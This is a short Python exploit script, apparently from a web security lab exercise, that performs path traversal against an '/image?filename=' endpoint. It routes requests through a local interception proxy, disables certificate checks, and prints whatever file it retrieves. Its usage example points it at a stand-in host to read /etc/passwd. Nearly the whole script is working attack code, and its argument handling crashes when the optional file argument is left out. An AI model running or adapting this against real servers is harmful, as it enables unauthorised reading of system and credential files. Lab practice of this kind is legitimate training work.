import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8081','https':'http://127.0.0.1:8081'}

def path_traversal(url, target_file):
    path = f"/image?filename={target_file}"
    r = requests.get(url+path, proxies=proxies, verify=False)
    if r.status_code == 200 and len(r.text) > 0:
        print(f"[+] Exploit Successful — {target_file}")
        print(r.text)
        sys.exit(0)
    else:
        print(f"[-] Exploit Failed. (status: {r.status_code})")
        sys.exit(-1)

def main():
    if len(sys.argv) < 2:
        print("[+] Usage: %s <url> [file]" % sys.argv[0])
        print("[+] Example: %s http://evil.com /etc/passwd" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1].rstrip('/')
    target_file = sys.argv[2]
    path_traversal(url, target_file)

if __name__ == "__main__":
    main()